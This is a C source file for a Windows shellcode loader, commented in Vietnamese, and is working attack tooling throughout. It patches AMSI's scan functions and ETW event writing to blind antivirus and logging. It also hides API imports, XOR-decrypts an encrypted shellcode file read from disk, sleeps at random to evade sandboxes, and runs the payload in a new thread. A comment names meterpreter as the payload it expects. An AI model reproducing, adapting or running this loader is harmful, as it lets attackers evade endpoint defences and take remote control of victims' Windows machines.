#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// ============ CONFIG ============
#define XOR_KEY 0xAA
#define FILENAME_LEN 16

unsigned char obfuscated_filename[] = {
    0xC2, 0xCB, 0xC6, 0xC7, 0xCB, 0xDB, 0xCA, 0xC1,
    0xCD, 0xD8, 0xCB, 0xD8, 0xC0, 0xC7, 0xCE, 0xCD
};
// ================================

// ===== AMSI PATCH =====
void patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL) return;
    
    // Windows 10 64-bit patch: XOR EAX, EAX; RET
    BYTE patch_64[] = { 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret  (trả về S_OK)
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer == NULL) return;
    
    DWORD old_protect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch_64), PAGE_EXECUTE_READWRITE, &old_protect);
    memcpy(pAmsiScanBuffer, patch_64, sizeof(patch_64));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch_64), old_protect, &old_protect);
    
    // Patch luôn AmsiScanString
    FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
    if (pAmsiScanString) {
        VirtualProtect(pAmsiScanString, sizeof(patch_64), PAGE_EXECUTE_READWRITE, &old_protect);
        memcpy(pAmsiScanString, patch_64, sizeof(patch_64));
        VirtualProtect(pAmsiScanString, sizeof(patch_64), old_protect, &old_protect);
    }
    
    FreeLibrary(hAmsi);
}

// ===== ETW PATCH =====
void patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return;
    
    // EtwEventWrite: XOR RAX, RAX; RET (x64)
    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite == NULL) return;
    
    DWORD old;
    VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), old, &old);
    
    // Patch thêm EtwEventWriteFull
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pEtwEventWriteFull) {
        VirtualProtect(pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
        memcpy(pEtwEventWriteFull, patch, sizeof(patch));
        VirtualProtect(pEtwEventWriteFull, sizeof(patch), old, &old);
    }
}

// ===== Helper functions =====
void deobfuscate_string(unsigned char *input, char *output, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ ((key + i) & 0xFF);
    }
    output[len] = '\0';
}

void xor_decrypt(unsigned char *data, SIZE_T len, unsigned char key) {
    for (SIZE_T i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// ===== Obfuscated API calls để tránh import table =====
typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int main() {
    // === BƯỚC 1: AMSI Patch (quan trọng nhất) ===
    patch_amsi();
    
    // === BƯỚC 2: ETW Patch ===
    patch_etw();
    
    // === BƯỚC 3: Resolve dynamic APIs ===
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
    fnVirtualFree pVirtualFree = (fnVirtualFree)GetProcAddress(hKernel32, "VirtualFree");
    fnCreateThread pCreateThread = (fnCreateThread)GetProcAddress(hKernel32, "CreateThread");
    
    if (!pVirtualAlloc || !pVirtualProtect) return 1;
    
    // === BƯỚC 4: Deobfuscate filename và đọc file ===
    char filename[FILENAME_LEN + 1];
    deobfuscate_string(obfuscated_filename, filename, FILENAME_LEN, XOR_KEY);
    
    FILE *file = fopen(filename, "rb");
    if (file == NULL) return 1;
    
    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    fseek(file, 0, SEEK_SET);
    if (filesize <= 0) { fclose(file); return 1; }
    
    // === BƯỚC 5: Allocate memory (RW) ===
    LPVOID exec_mem = pVirtualAlloc(NULL, filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) { fclose(file); return 1; }
    
    fread(exec_mem, 1, filesize, file);
    fclose(file);
    
    // === BƯỚC 6: Decrypt shellcode ===
    xor_decrypt((unsigned char *)exec_mem, filesize, XOR_KEY);
    
    // === BƯỚC 7: Sleep jitter (2-5s) ===
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    Sleep(2000 + (rand() % 3000));
    
    // === BƯỚC 8: Change to EXECUTE_READ ===
    DWORD old_protect;
    pVirtualProtect(exec_mem, filesize, PAGE_EXECUTE_READ, &old_protect);
    
    // === BƯỚC 9: Execute ===
    // Cách 1: Thread execution
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
    }
    
    // Cách 2: Callback (fallback nếu thread không hoạt động)
    // ((void(*)())exec_mem)();
    
    // Cách 3: Exit process hiện tại, giữ shellcode chạy trong thread riêng
    // ExitProcess(0); // Uncomment nếu muốn kill process gốc
    
    // Wait một chút để shellcode kịp chạy
    Sleep(1000);
    
    // Cleanup (sẽ không chạy tới đây nếu meterpreter đã takeover)
    pVirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
